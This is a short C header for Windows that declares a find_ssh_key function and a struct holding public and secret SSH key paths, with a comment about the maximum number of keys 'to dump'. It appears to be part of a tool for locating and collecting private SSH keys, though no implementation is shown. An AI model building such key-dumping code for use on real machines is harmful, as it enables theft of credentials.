#ifndef _FIND_SSH_KEY
#define _FIND_SSH_KEY
#include <windows.h>

// Max number of possible ssh keys to dump.
// To avoid usage of linked list (lazy)
#define MAX_KEY_FILES 30

// Simple structure representing a ssh
typedef struct sshKey {
  PWSTR publicKeyPath;
  PWSTR secretKeyPath;
} sshKey;

void find_ssh_key(const PWSTR, sshKey [MAX_KEY_FILES], DWORD32 *);
#endif